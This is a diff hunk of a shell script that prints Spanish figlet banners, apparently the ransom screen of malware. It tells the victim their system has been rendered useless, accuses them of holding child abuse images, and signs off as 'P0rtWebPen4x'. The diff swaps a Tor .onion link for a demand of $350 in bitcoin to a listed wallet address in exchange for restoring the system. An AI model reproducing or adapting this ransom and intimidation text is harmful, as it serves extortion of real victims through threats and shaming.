@@ -11,8 +11,6 @@ echo "==========================================================================
 figlet -t -k -c Te preguntaras que ha pasado? He dejado inutil tu sistema, te lo mereces por tu buen comportamiento.
 figlet -t -k -c Asi aprenderas a no guardar CP en tu galeria.
 figlet -t -k -c Soy P0rtWebPen4x, quien govierna a los pedofilos como tu.
-figlet -t -k -c Descarga el TOR y visita esta pagina-- http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/
-figlet -t -k -c Todo se hace de buen corazon y por tener una mejor sociedad. Cuidate hermano.
-
-   
+figlet -t -k -c Deposita 350$ en bitcoins para que todo vuelva a la normalidad; 1JyKmBot92PV5rN5tsAYgRxJmtDADiQx5B
+figlet -t -k -c Todo se hace de buen corazon y por tener una mejor sociedad. Cuidate hermano.   
 echo "==================================================================================================================================="  
